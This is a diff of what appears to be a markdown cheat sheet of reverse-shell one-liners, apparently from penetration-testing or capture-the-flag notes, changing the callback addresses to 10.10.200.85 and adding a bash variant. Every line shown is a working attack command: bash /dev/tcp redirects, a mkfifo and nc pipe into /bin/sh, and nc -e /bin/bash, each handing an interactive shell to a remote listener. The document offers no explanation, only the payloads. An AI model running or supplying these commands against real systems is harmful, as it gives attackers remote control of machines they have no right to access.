@@ -5,7 +5,8 @@ tags:
 ---
 ## bash:
 ```sh
-bash -i >& /dev/tcp/192.168.48.128/1337 0>&1
+/usr/bin/bash -i >& /dev/tcp/10.10.200.85/1337 0>&1
+bash -c /bin/bash -i >& /dev/tcp/10.10.200.85/9001 0>&1
 ```
 ## rm:
 ```sh
@@ -13,7 +14,7 @@ rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.48.128 1777 >/t
 ```
 ## nc:
 ```sh
-nc -e /bin/bash 192.168.48.128 1337
+nc -e /bin/bash 10.10.200.85 1337
 ```
 ## python:
 ```python
